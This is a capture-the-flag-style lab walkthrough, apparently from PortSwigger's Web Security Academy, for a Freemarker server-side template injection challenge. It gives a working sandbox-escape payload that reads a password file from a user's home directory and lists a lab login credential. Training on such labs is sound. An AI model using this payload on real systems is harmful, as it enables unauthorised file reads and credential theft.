## Server-side template injection in a sandboxed environment

**Category:** ssti
**Difficulty:** Unknown

### Description
This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the filemy_password.txtfrom Carlos's home directory. Then submit the contents of the file.

### Solution Steps
1. Log in and edit one of the product description templates. Notice that you have access to the product object.
2. Load the JavaDoc for the Object class to find methods that should be available on all objects. Confirm that you can execute ${object.getClass()} using the product object.
3. Explore the documentation to find a sequence of method invocations that grant access to a class with a static method that lets you read a file, such as: ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
4. Enter this payload in one of the templates and save. The output will contain the contents of the file as decimal ASCII code points.
5. Convert the returned bytes to ASCII.
6. Click the "Submit solution" button and submit this string to solve the lab.

### Key Payloads
- `my_password.txt`
- `content-manager:C0nt3ntM4n4g3r`
- `product`
- `Object`
- `${object.getClass()}`
- `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: ssti

---
*Source: PortSwigger Web Security Academy*
